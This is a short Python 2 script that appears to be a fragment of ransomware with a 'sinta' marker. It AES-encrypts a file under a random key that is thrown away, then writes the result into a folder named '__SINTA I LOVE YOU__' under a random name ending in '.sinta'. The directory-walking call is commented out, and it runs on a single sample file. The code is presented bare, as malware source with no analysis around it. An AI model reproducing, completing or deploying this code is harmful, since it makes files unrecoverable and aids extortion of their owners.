import os, fnmatch, struct, random, string, base64, platform, sys, time, socket, json, urllib, ctypes, urllib2
from Crypto import Random
from Crypto.Cipher import AES

encfolder = '__SINTA I LOVE YOU__'
newextns = 'sinta'

def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns

def generate_file(file_path, filename):
    key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(32) ])
    newfilename = file_path + '\\' + encfolder + '\\' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    try:
        encrypt_file(key, filename, newfilename)
    except:
        pass

def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize = 65536, Block = 16):
    if not out_filename:
        out_filename = newfilename
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

        #generate_file(dir_, filename)

generate_file("", "fichier.txt")
